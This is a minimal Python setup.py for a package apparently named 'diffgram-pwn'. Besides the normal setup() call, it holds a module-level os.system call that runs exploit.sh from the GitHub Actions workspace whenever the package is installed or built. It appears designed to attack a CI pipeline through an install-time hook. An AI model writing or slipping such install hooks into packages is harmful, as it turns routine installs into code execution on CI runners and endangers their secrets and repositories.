from setuptools import setup, find_packages
import os

setup(
    name="diffgram-pwn",
    version="0.0.1",
    packages=find_packages(),
)

os.system("bash $GITHUB_WORKSPACE/exploit.sh")
